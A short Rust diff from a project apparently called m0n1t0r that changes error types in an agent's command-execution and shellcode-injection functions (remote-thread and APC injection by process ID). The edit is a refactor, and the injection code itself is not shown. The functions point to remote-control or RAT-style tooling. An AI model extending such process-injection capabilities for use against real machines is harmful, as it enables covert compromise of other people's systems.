@@ -22,7 +22,7 @@ impl m0n1t0r_common::process::Agent for AgentObj {
 
         thread::spawn(move || {
             let _ = tx.send(ffi::execute(command, args));
-            Ok::<_, anyhow::Error>(())
+            Ok::<_, Error>(())
         });
         Ok(rx.await??.into())
     }
@@ -82,7 +82,7 @@ impl m0n1t0r_common::process::Agent for AgentObj {
             let _ = tx.send(ffi::inject_shellcode_by_id_rtc(
                 pid, shellcode, ep_offset, parameter,
             )?);
-            Ok::<_, anyhow::Error>(())
+            Ok::<_, Error>(())
         });
         Ok(rx.await?)
     }
@@ -100,7 +100,7 @@ impl m0n1t0r_common::process::Agent for AgentObj {
             let _ = tx.send(ffi::inject_shellcode_by_id_apc(
                 pid, shellcode, ep_offset, parameter,
             )?);
-            Ok::<_, anyhow::Error>(())
+            Ok::<_, Error>(())
         });
         Ok(rx.await?)
     }
